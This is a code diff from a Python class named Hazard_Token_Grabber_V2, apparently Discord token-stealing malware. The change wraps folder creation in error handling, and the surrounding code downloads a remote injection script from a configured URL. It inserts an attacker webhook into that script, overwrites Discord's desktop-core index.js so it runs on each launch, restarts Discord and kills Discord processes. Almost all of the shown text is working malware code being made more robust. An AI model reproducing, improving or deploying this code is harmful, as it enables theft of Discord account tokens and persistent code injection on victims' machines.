@@ -160,13 +160,17 @@ class Hazard_Token_Grabber_V2(functions):
                     if match(r'app-(\d*\.\d*)*', __dir):
                         app = os.path.abspath(disc_sep+__dir)
                         inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\'
-                        os.makedirs(inj_path+'initiation', exist_ok=True)
-                        if os.path.exists(inj_path):
-                            f = httpx.get(self.config('injection_url')).text.replace(
-                                "%WEBHOOK%", self.webhook)
-                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
-                                indexFile.write(f)
-                            os.startfile(app + self.sep + _dir + '.exe')
+                        try:
+                            os.makedirs(inj_path+'initiation', exist_ok=True)
+                        except (FileExistsError,PermissionError):
+                            pass
+                        finally:
+                            if os.path.exists(inj_path):
+                                f = httpx.get(self.config('injection_url')).text.replace(
+                                    "%WEBHOOK%", self.webhook)
+                                with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
+                                    indexFile.write(f)
+                                os.startfile(app + self.sep + _dir + '.exe')
 
     def killDiscord(self):
         for proc in psutil.process_iter():
